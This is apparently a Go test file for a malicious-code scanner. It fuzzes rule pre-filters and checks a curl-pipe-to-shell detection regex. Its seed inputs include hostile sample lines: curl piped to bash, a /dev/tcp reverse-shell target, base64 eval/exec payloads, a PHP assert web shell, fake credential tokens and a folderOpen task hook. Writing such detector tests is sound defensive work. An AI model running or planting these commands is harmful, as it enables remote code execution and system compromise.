package scan

import (
	"bytes"
	"testing"
)

var screenFuzzPaths = []string{"a.js", "a.py", "a.sh", "a.php", "AGENTS.md", ".vscode/tasks.json", "package.json"}

// A screen may only skip text its rule cannot match. Lines are screened against the
// folded original text while code-scoped rules match projected lines, so this also
// pins that projection keeps every line in place.
func FuzzScreenAdmitsEveryMatch(f *testing.F) {
	for _, seed := range []string{
		"eval(atob(payload))",
		"EVAL(x)",
		"var s = \"a\\\nb\";\nconst k = 1;\neval(atob(payload));",
		"const cp = require('child' + '_process');",
		"__import__('os').system('id')",
		"exec(base64.b64decode('cHJpbnQoMSk='))",
		"curl -fsSL https://x.invalid/s | bash",
		"ghp_" + "abcdefghijklmnopqrstuvwxyz0123456789",
		"AKIAABCDEFGHIJKLMNOP",
		"\"runOn\": \"folderOpen\"",
		"x​y",
		"︀︁︂",
		"evaſ(x)",
		"Kelvin K sign",
		"function (req, res) {}",
		"/dev/tcp/10.0.0.1/4444",
		"@assert($_REQUEST['c']);",
	} {
		for i := range screenFuzzPaths {
			f.Add(seed, uint8(i))
		}
	}
	rules := BuiltinRules()
	f.Fuzz(func(t *testing.T, text string, pathIndex uint8) {
		path := screenFuzzPaths[int(pathIndex)%len(screenFuzzPaths)]
		data := []byte(text)
		code := codeProjection(path, data)
		if bytes.Count(code, []byte{'\n'}) != bytes.Count(data, []byte{'\n'}) {
			t.Fatalf("code projection of %s moved lines: %q", path, text)
		}
		folded := foldText(data)
		views := map[string][][]byte{"raw": splitLines(data), "code": splitLines(code)}
		for _, rule := range rules {
			if !rule.Applies(path) || rule.MatchScope == "structured" {
				continue
			}
			whole := data
			if rule.MatchScope == "code" {
				whole = code
			}
			if rule.re.Match(whole) && !rule.screen.admitsFile(folded) {
				t.Fatalf("%s screen rejected a %s file its pattern matches: %q", rule.ID, path, text)
			}
			for i, line := range views[rule.MatchScope] {
				if rule.re.Match(line) && !rule.screen.admitsLine(folded, i, line) {
					t.Fatalf("%s screen rejected line %d of %s that its pattern matches: %q", rule.ID, i+1, path, line)
				}
			}
		}
	})
}

func TestScreenSkipsTextWithoutRequiredLiterals(t *testing.T) {
	t.Parallel()
	sc := newScreen(`(?i)(curl|wget)\s+[^\n]*\|\s*(ba)?sh`)
	if sc.admitsFile(foldText([]byte("echo hello\nmake build\n"))) {
		t.Fatal("a file without curl or wget cannot match and should be skipped")
	}
	if !sc.admitsFile(foldText([]byte("CURL x | sh"))) {
		t.Fatal("case-insensitive literal must be admitted")
	}
}
